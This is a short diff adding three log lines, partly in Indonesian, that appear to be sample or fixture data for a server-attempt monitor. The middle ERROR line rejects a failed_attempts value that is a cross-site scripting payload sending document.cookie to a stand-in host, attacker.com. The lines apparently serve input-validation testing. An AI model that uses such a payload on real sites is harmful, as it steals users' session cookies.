@@ -1,0 +1,3 @@
+2026-09-16 22:13:17,753 - [INFO] - server : SRV-PROD-02 aman. Sudah melakukan 3 kali|Client_ip : 127.0.0.1
+2026-09-16 22:13:38,743 - [ERROR] - server SRV-99, format failed_attempts "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" tidak valid
+2026-09-16 22:13:45,111 - [INFO] - server : SRV-PROD-02 aman. Sudah melakukan 3 kali|Client_ip : 127.0.0.1
